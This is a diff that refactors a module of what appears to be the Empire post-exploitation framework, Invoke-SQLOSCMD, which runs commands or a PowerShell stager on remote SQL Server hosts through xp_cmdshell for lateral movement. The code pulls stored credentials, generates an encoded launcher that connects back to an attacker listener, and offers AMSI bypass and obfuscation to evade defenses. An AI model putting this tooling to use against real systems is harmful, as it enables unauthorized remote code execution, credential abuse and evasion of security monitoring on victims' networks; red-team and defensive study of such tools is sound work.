@@ -1,160 +1,88 @@
 from __future__ import print_function
 
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-    def __init__(self, mainMenu, params=[]):
-        self.info = {
-            'Name': 'Invoke-SQLOSCMD',
-            'Author': ['@nullbind', '@0xbadjuju'],
-            'Description': ('Executes a command or stager on remote hosts using xp_cmdshell.'),
-            'Software': '',
-            'Techniques': ['T1505'],
-            'Background' : True,
-            'OutputExtension' : None,
-            'NeedsAdmin' : False,
-            'OpsecSafe' : True,
-            'Language' : 'powershell',
-            'MinPSVersion' : '2',
-            'MinLanguageVersion' : '2',
-            
-            'Comments': []
-        }
-        self.options = {
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'CredID' : {
-                'Description'   :   'CredID from the store to use.',
-                'Required'      :   False,
-                'Value'         :   ''                
-            },
-            'Instance' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Command' : {
-                'Description'   :   'Custom command to execute on remote hosts.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'UserName' : {
-                'Description'   :   '[domain\]username to use to execute command.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Password' : {
-                'Description'   :   'Password to use to execute command.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            }
-        }
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
 
-        self.mainMenu = mainMenu
-        for param in params:
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
-        credID = self.options["CredID"]['Value']
-        if credID != "":
-            if not self.mainMenu.credentials.is_credential_valid(credID):
+        cred_id = params["CredID"]
+        if cred_id != "":
+            if not main_menu.credentials.is_credential_valid(cred_id):
                 print(helpers.color("[!] CredID is invalid!"))
                 return ""
-            (credID, credType, domainName, username, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
+            (cred_id, credType, domainName, username, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]
             if domainName != "":
-                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(username)
+                params["UserName"] = str(domainName) + "\\" + str(username)
             else:
-                self.options["UserName"]['Value'] = str(username)
+                params["UserName"] = str(username)
             if password != "":
-                self.options["Password"]['Value'] = password
+                params["Password"] = password
 
         # Set booleans to false by default
-        Obfuscate = False
-        AMSIBypass = False
-        AMSIBypass2 = False
+        obfuscate = False
+        amsi_bypass = False
+        amsi_bypass2 = False
 
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        instance = self.options['Instance']['Value']
-        command = self.options['Command']['Value']
-        username = self.options['UserName']['Value']
-        password = self.options['Password']['Value']
-        if (self.options['Obfuscate']['Value']).lower() == 'true':
-            Obfuscate = True
-        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
-        if (self.options['AMSIBypass']['Value']).lower() == 'true':
-            AMSIBypass = True
-        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
-            AMSIBypass2 = True
+        listener_name = params['Listener']
+        userAgent = params['UserAgent']
+        proxy = params['Proxy']
+        proxy_creds = params['ProxyCreds']
+        instance = params['Instance']
+        command = params['Command']
+        username = params['UserName']
+        password = params['Password']
+        if (params['Obfuscate']).lower() == 'true':
+            obfuscate = True
+        obfuscate_command = params['ObfuscateCommand']
+        if (params['AMSIBypass']).lower() == 'true':
+            amsi_bypass = True
+        if (params['AMSIBypass2']).lower() == 'true':
+            amsi_bypass2 = True
 
 
-        moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
-        moduleCode = ""
+        module_source = main_menu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
+        module_code = ""
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            with open(moduleSource, 'r') as source:
-                moduleCode = source.read()
+            with open(module_source, 'r') as source:
+                module_code = source.read()
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
-        script = moduleCode
+        script = module_code
 
 
         if command == "":
-            if not self.mainMenu.listeners.is_listener_valid(listenerName):
-                print(helpers.color("[!] Invalid listener: " + listenerName))
+            if not main_menu.listeners.is_listener_valid(listener_name):
+                print(helpers.color("[!] Invalid listener: " + listener_name))
                 return ""
             else:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
+                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscate_command, userAgent=userAgent, proxy=proxy, proxyCreds=proxy_creds, AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
                 if launcher == "":
                     return ""
                 else:
                     command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
 
-        scriptEnd = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  
+        script_end = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)
 
         if username != "":
-            scriptEnd += " -UserName "+username
+            script_end += " -UserName "+username
         if password != "":
-            scriptEnd += " -Password "+password
+            script_end += " -Password "+password
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-        script += scriptEnd
+            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
+        script += script_end
         script = helpers.keyword_obfuscation(script)
 
         return script
